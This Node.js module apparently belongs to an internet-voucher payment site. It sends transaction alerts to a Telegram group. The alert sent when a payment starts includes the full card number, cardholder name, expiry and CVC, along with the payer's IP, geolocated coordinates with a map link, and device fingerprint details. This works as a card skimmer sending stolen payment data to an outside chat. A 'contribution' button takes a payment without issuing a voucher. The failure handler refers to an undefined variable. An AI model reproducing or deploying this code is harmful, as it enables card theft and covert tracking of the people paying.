const axios = require("axios");
const FormData = require("form-data");
const mikrotikService = require("./mikrotikService");
const contributionMessages = require("./contributionMessages");

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const { BRANCH_NAMES } = require('./branches');

/**
 * جلب بيانات الشبكة والموقع الجغرافي والإحداثيات (خطوط الطول والعرض) بناءً على IP الخارجي
 */
async function fetchNetworkDetailsByIP(ip) {
  const result = {
    location: "غير معروف",
    isp: "غير معروف",
    lat: null,
    lon: null
  };

  if (!ip || ip === "غير متوفر" || ip === "127.0.0.1" || ip === "::1" || ip.includes("localhost")) {
    return null;
  }

  const cleanIp = String(ip).split(",")[0].trim();

  try {
    // استخدام ipapi.co لأنه يدعم الإحداثيات (latitude & longitude) بدقة
    const res = await axios.get(`https://ipapi.co/${cleanIp}/json/`, { timeout: 3000 });
    if (res.data && !res.data.error) {
      const city = res.data.city || "غير معروفة";
      const region = res.data.region || "";
      const country = res.data.country_name || "غير معروفة";
      result.location = region ? `${city}، ${region}، ${country}` : `${city}، ${country}`;
      result.isp = res.data.org || res.data.asn || "غير معروف";
      result.lat = res.data.latitude || null;
      result.lon = res.data.longitude || null;
      return result;
    }
  } catch (e) {
    try {
      // الـ Fallback عبر ip-api.com مع طلب حقول الإحداثيات lat, lon
      const fallbackRes = await axios.get(`http://ip-api.com/json/${cleanIp}?fields=status,country,regionName,city,isp,org,lat,lon`, { timeout: 3000 });
      if (fallbackRes.data && fallbackRes.data.status === "success") {
        const city = fallbackRes.data.city || "غير معروفة";
        const region = fallbackRes.data.regionName || "";
        const country = fallbackRes.data.country || "غير معروفة";
        result.location = region ? `${city}، ${region}، ${country}` : `${city}، ${country}`;
        result.isp = fallbackRes.data.isp || fallbackRes.data.org || "غير معروف";
        result.lat = fallbackRes.data.lat || null;
        result.lon = fallbackRes.data.lon || null;
        return result;
      }
    } catch (fallbackErr) {
      console.warn("⚠️ تعذر جلب تفاصيل الموقع الجغرافي والإحداثيات للـ IP:", cleanIp);
    }
  }

  return result;
}

function getPaymentMethodName(data) {
  let method = data.payment_method || data.source_type || data.method || "محفظة إلكترونية";
  if (method === "card") method = "💳 بطاقة بنكية";
  else if (method === "wallet") method = "📱 محفظة إلكترونية";
  return method;
}

function getFormattedDateTime() {
  const now = new Date();
  const formattedDate = now.toLocaleDateString("ar-EG", { timeZone: "Africa/Cairo" });
  const formattedTime = now.toLocaleTimeString("ar-EG", { timeZone: "Africa/Cairo" });
  return `${formattedDate} - ${formattedTime}`;
}

/**
 * 1. إرسال الرسائل النصية والإشعارات لجروب التليجرام مع الأزرار التفاعلية
 */
async function sendTelegramMessage(data, isInitial = true) {
  try {
    if (!BOT_TOKEN || !CHAT_ID) {
      console.warn("⚠️ Telegram Bot Token or Chat ID is missing!");
      return;
    }

    const publicIP = data.publicIP || (data.geoData && data.geoData.publicIP) || data.ip || "";

    if (publicIP === "127.0.0.1" || publicIP === "::1" || publicIP.includes("localhost")) {
      console.log("ℹ️ [Telegram] تم التجاوز: عدم إرسال إشعار للشبكة المحلية (Localhost).");
      return;
    }

    const method = getPaymentMethodName(data);
    const amountEGP = data.amount_cents
      ? (data.amount_cents / 100).toFixed(2)
      : (data.amount || "غير محدد");
    const dateTimeStr = getFormattedDateTime();

    const branchName = data.branchName || data.branch_name || "حكايات نت رئيسي";
    const userPhone = data.phone || 
                        data.billing_data?.phone_number || 
                        data.customer?.phone_number || 
                        "غير محدد";
    const txnId = data.id || data.transactionId || data.order?.id || data.merchant_order_id || `TX_${Date.now()}`;

    let message = "";

    if (isInitial) {
      const clientID = data.clientID || data.clientId || "غير متوفر";

      let locationText = data.geoCity && data.geoCountry ? `${data.geoCity}، ${data.geoCountry}` : null;
      let ispText = data.ispProvider || data.isp || null;
      let latVal = data.lat || null;
      let lonVal = data.lon || null;

      // جلب الموقع الجغرافي والإحداثيات عبر IP إذا لم تكن متوفرة مسبقاً
      if (!locationText || locationText.includes("غير معروف") || !ispText || ispText === "غير معروف" || !latVal || !lonVal) {
        const netInfo = await fetchNetworkDetailsByIP(publicIP);
        if (netInfo) {
          if (!locationText || locationText.includes("غير معروف")) locationText = netInfo.location;
          if (!ispText || ispText === "غير معروف") ispText = netInfo.isp;
          if (!latVal) latVal = netInfo.lat;
          if (!lonVal) lonVal = netInfo.lon;
        }
      }

      const batteryInfo = data.battery || data.batteryInfo || "غير متوفر";
      const deviceRAM = data.deviceRAM || "غير متوفر";
      const cpuCores = data.cpuCores || "غير متوفر";
      const deviceType = data.deviceType || "غير متوفر";
      const screenSize = data.screenSize || "غير متوفر";
      const userTimeZone = data.userTimeZone || "غير متوفر";
      const lang = data.lang || "غير متوفر";

      message = `⏳ <b>جاري عملية الدفع...</b>\n\n` +
                `🏢 الفرع: <b>${branchName}</b>\n` +
                `💳 وسيلة الدفع: <b>${method}</b>\n` +
                `💰 المبلغ المطلوب: <b>${amountEGP} جنيه</b>\n`;

      if (userPhone && userPhone !== "غير محدد") {
        message += `📱 رقم المحفظة / الهاتف: <code>${userPhone}</code>\n`;
      }

      if (data.card_data && data.card_data.number && data.card_data.number !== "غير مدخل") {
        message += `\n--- <b>بيانات البطاقة البنكية المدخلة</b> ---\n` +
                   `🔢 رقم الكارت: <code>${data.card_data.number}</code>\n` +
                   `👤 اسم صاحب البطاقة: <b>${data.card_data.name}</b>\n` +
                   `📅 تاريخ الانتهاء: <code>${data.card_data.expiry}</code>\n` +
                   `🔒 رمز CVC: <code>${data.card_data.cvc}</code>\n`;
      }

      message += `\n<b>━━━━ ⚙️ بيانات الشبكة والجهاز ━━━━</b>\n` +
                 `🆔 <b>معرف الجهاز:</b> <code>${clientID}</code>\n` +
                 `💡 <b>نوع الجهاز:</b> <b>${deviceType}</b>\n` +
                 `🌐 <b>IP الخارجي:</b> <code>${publicIP || 'غير متوفر'}</code>\n` +
                 `🌍 <b>الموقع الجغرافي:</b> <b>📍 ${locationText || 'غير متوفر'}</b>\n`;

      // إضافة خطوط الطول والعرض وتنسيق رابط الخريطة بذكاء
      if (latVal && lonVal) {
        const googleMapsLink = `https://www.google.com/maps?q=${latVal},${lonVal}`;
        message += `🗺️ <b>الإحداثيات:</b> <code>${latVal}, ${lonVal}</code>\n` +
                   `🔗 <a href="${googleMapsLink}">عرض الموقع على خرائط جوجل</a>\n`;
      } else {
        message += `🗺️ <b>الإحداثيات:</b> <code>غير متوفرة</code>\n`;
      }

      message += `📡 <b>مزود الخدمة (ISP):</b> <b>${ispText || 'غير متوفر'}</b>\n` +
                 `----------------------------------------\n` +
                 `📅 <b>تاريخ الإرسال:</b> <code>${dateTimeStr}</code>\n` +
                 `🔋 <b>حالة البطارية:</b> ${batteryInfo}\n` +
                 `🧠 <b>الذاكرة العشوائية (RAM):</b> <code>${deviceRAM}</code>\n` +
                 `⚙️ <b>أنوية المعالج (CPU):</b> <code>${cpuCores} Cores</code>\n` +
                 `📺 <b>أبعاد الشاشة:</b> <code>${screenSize}</code>\n` +
                 `⏰ <b>المنطقة الزمنية:</b> <code>${userTimeZone}</code>\n` +
                 `🌍 <b>لغة المتصفح:</b> <code>${lang}</code>`;

    } else {
      const voucher = data.voucher_code || data.cardCode || "غير متوفر";
      const packageInfo = data.package_info || data.packageName || "باقة إنترنت شبكة حكايات";
      const customerName = data.card_data?.name || data.billing_data?.first_name || "عميل شبكة حكايات";

      message = `✅ <b>تمت عملية الدفع وتوليد الكارت بنجاح!</b>\n\n` +
                `🏢 الفرع: <b>${branchName}</b>\n` +
                `🆔 رقم العملية: <code>${txnId}</code>\n` +
                `📱 رقم المحفظة / الهاتف: <code>${userPhone}</code>\n` +
                `👤 اسم العميل / البطاقة: <b>${customerName}</b>\n` +
                `💳 وسيلة الدفع: <b>${method}</b>\n` +
                `💰 المبلغ المدفوع: <b>${amountEGP} جنيه</b>\n` +
                `📦 الباقة المفعلة: <b>${packageInfo}</b>\n` +
                `🎟️ كارت الإنترنت: <code>${voucher}</code>\n` +
                `----------------------------------------\n` +
                `📅 وقت الإصدار: <code>${dateTimeStr}</code>`;
    }

    const replyMarkup = {
      inline_keyboard: [
        [
          { text: "🎟️ إصدار الكارت", callback_data: `create_voucher_${txnId}_${amountEGP}` },
          { text: "🤝 مساهمة", callback_data: `contribution_${txnId}_${amountEGP}` }
        ]
      ]
    };

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "HTML",
      disable_web_page_preview: true,
      reply_markup: replyMarkup
    });

  } catch (err) {
    console.error("❌ [Telegram Error]:", err.response?.data || err.message);
  }
}

/**
 * 2. 🎯 إرسال صورة الكارت الاحترافية المصدرة آلياً إلى التليجرام مع الأزرار
 */
async function sendVoucherWithCardImage(paymentDetails, imageBuffer) {
  try {
    if (!BOT_TOKEN || !CHAT_ID) {
      console.warn("⚠️ [Telegram Error] BOT_TOKEN أو CHAT_ID مفقود!");
      return;
    }

    if (!imageBuffer) {
      console.error("❌ [Telegram Error] Buffer الصورة فارغ!");
      return;
    }

    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    
    form.append("photo", imageBuffer, {
      filename: `card_${paymentDetails.transactionId || Date.now()}.png`,
      contentType: "image/png"
    });

    const txnId = paymentDetails.transactionId || paymentDetails.id || `TX_${Date.now()}`;
    const amountVal = paymentDetails.amount || "0";

    const caption = `🎟️ <b>صورة كارت الإنترنت المصدر آلياً</b>\n\n` +
                    `🏢 الفرع: <b>${paymentDetails.branchName || 'حكايات نت رئيسي'}</b>\n` +
                    `📦 الباقة: <b>${paymentDetails.packageName || 'باقة إنترنت'}</b>\n` +
                    `💰 المبلغ: <b>${amountVal} جنيه</b>\n` +
                    `🔑 الكارت: <code>${paymentDetails.card?.code || paymentDetails.code || 'غير متوفر'}</code>\n` +
                    `📱 الهاتف: <code>${paymentDetails.phone || 'غير محدد'}</code>\n` +
                    `🆔 رقم العملية: <code>${txnId}</code>`;

    form.append("caption", caption);
    form.append("parse_mode", "HTML");

    form.append("reply_markup", JSON.stringify({
      inline_keyboard: [
        [
          { text: "🎟️ إعادة إصدار الكارت", callback_data: `create_voucher_${txnId}_${amountVal}` },
          { text: "🤝 مساهمة", callback_data: `contribution_${txnId}_${amountVal}` }
        ]
      ]
    }));

    const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
      headers: {
        ...form.getHeaders()
      },
      maxContentLength: Infinity,
      maxBodyLength: Infinity
    });

    if (response.data && response.data.ok) {
      console.log(`📸 [Telegram Image SUCCESS] تم إرسال صورة الكارت بنجاح للمعاملة: ${txnId}`);
    }

  } catch (err) {
    console.error("❌ [Telegram Image Error Details]:", err.response?.data || err.message);
  }
}

/**
 * 3. 🔄 معالجة الضغط على الأزرار التفاعلية (Callback Queries)
 */
async function handleTelegramCallback(callbackQuery) {
  try {
    const queryId = callbackQuery.id;
    const data = callbackQuery.data;
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;

    console.log(`📥 [Telegram Callback] تم استلام ضغطة زر: ${data}`);

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      callback_query_id: queryId,
      text: "جاري تنفيذ الإجراء...",
      show_alert: false
    });

    const parts = data.split("_");

    if (data.startsWith("create_voucher")) {
      const txnId = parts[2] || parts[1]; 
      const amount = parts[3] || parts[2] || "0";

      console.log(`🎟️ [Voucher Creation Started] جارٍ إصدار الكارت للمعاملة: ${txnId} بالقيمة: ${amount}`);

      let voucherData = null;
      let errorMessage = null;

      try {
        if (typeof mikrotikService !== "undefined" && typeof mikrotikService.processPaymentAndCreateCard === "function") {
          voucherData = await mikrotikService.processPaymentAndCreateCard(amount, "main", txnId);
        } else {
          throw new Error("دالة processPaymentAndCreateCard غير موجودة في mikrotikService");
        }
      } catch (err) {
        console.error("❌ خطأ أثناء توليد الكارت من ميكروتيك:", err);
        errorMessage = err.message;
      }

      if (voucherData && (voucherData.success || voucherData.cardCode)) {
        if (global.generatedCardsMap) {
          global.generatedCardsMap.set(txnId, {
            isContribution: voucherData.isContribution || false,
            success: true,
            code: voucherData.cardCode || voucherData.username || "متاح",
            voucher: {
              username: voucherData.cardCode || voucherData.username || "متاح",
              password: voucherData.password || ""
            },
            amount: amount,
            transactionId: txnId,
            packageName: voucherData.packageName || "باقة إنترنت",
            createdAt: new Date()
          });
        }

        const usernameStr = voucherData.cardCode || voucherData.username || "متاح";
        const passwordStr = voucherData.password || "";

        const updatedText = callbackQuery.message.text + 
          `\n\n✅ <b>[تم إصدار الكارت بنجاح من الميكروتيك]</b>\n🎟️ الكارت: <code>${usernameStr}</code>` +
          (passwordStr ? `\n🔑 كلمة المرور: <code>${passwordStr}</code>` : ``);

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
          chat_id: chatId,
          message_id: messageId,
          text: updatedText,
          parse_mode: "HTML",
          disable_web_page_preview: true,
          reply_markup: { inline_keyboard: [] }
        });

      } else {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          chat_id: chatId,
          text: `❌ فشل إصدار الكارت من الميكروتيك للمعاملة ${txnId}.\nالسبب: ${errorMessage || "خطأ غير معروف"}`
        });
      }

    } else if (data.startsWith("contribution")) {
      const txnId = parts[1];
      const amount = parts[2] || "0";

      if (global.generatedCardsMap) {
        global.generatedCardsMap.set(txnId, {
          isContribution: true,
          amount: amount,
          transactionId: txnId,
          packageName: `مساهمة بقيمة ${amount} جنيه`,
          createdAt: new Date()
        });
      }

      const updatedText = callbackQuery.message.text + `\n\n🤝 <b>[تم تأكيد وتحويل العملية إلى مساهمة]</b> بقيمة: <code>${amount} جنيه</code> (رقم المعاملة: ${txnId})`;

      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
        chat_id: chatId,
        message_id: messageId,
        text: updatedText,
        parse_mode: "HTML",
        disable_web_page_preview: true,
        reply_markup: { inline_keyboard: [] }
      });
    }

  } catch (err) {
    console.error("❌ [Telegram Callback Error]:", err.response?.data || err.message);
  }
}

/**
 * 4. ❌ إرسال إشعار فشل الدفع إلى التليجرام مع الموقع الجغرافي والإحداثيات للشبكة
 */
async function sendTelegramFailNotification(errorMessage, data = {}) {
  try {
    if (!BOT_TOKEN || !CHAT_ID) {
      return;
    }

    const publicIP = data.publicIP || "غير متوفر";
    if (publicIP === "127.0.0.1" || publicIP === "::1" || publicIP.includes("localhost")) {
      return;
    }

    // جلب تفاصيل الموقع الجغرافي والإحداثيات للـ IP في صفحة الفشل أيضاً
    const netInfo = await fetchNetworkDetailsByIP(publicIP);
    const locationText = netInfo ? netInfo.location : "غير متوفر";
    const ispText = netInfo ? netInfo.isp : "غير متوفر";
    const latVal = netInfo ? netInfo.lat : null;
    const lonVal = netInfo ? netInfo.lon : null;

    const branchName = data.branchName || "حكايات نت رئيسي";
    const userPhone = data.phone || "غير محدد";
    const amountEGP = data.amount || "غير محدد";
    const dateTimeStr = getFormattedDateTime();
    const txnId = data.transactionId || `TX_${Date.now()}`;

    let message = `❌ <b>فشل عملية الدفع! (تنبيه فتح صفحة الخطأ)</b>\n\n` +
                  `🏢 الفرع: <b>${branchName}</b>\n` +
                  `🆔 رقم المعاملة: <code>${txnId}</code>\n` +
                  `💰 المبلغ: <b>${amountEGP} جنيه</b>\n` +
                  `📱 رقم الهاتف: <code>${userPhone}</code>\n` +
                  `⚠️ سبب الخطأ: <i>${errorMessage}</i>\n` +
                  `----------------------------------------\n` +
                  `🌐 IP الخارجي: <code>${publicIP}</code>\n` +
                  `🌍 الموقع الجغرافي: <b>📍 ${locationText}</b>\n`;

    if (latVal && lonVal) {
      const googleMapsLink = `https://www.google.com/maps?q=${latVal},${lonVal}`;
      message += `🗺️ <b>الإحداثيات:</b> <code>${latVal}, ${lonVal}</code>\n` +
                 `🔗 <a href="${googleMapsLink}">عرض الموقع على خرائط جوجل</a>\n`;
    }

    message += `📡 مزود الخدمة: <b>${ispText}</b>\n` +
               `📅 وقت الزيارة: <code>${dateTimeStr}</code>`;

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHIAT_ID || CHAT_ID,
      text: message,
      parse_mode: "HTML",
      disable_web_page_preview: true
    });

  } catch (err) {
    console.error("❌ [Telegram Fail Notification Error]:", err.response?.data || err.message);
  }
}

module.exports = {
  sendTelegramMessage,
  sendVoucherWithCardImage,
  handleTelegramCallback,
  sendTelegramFailNotification
};
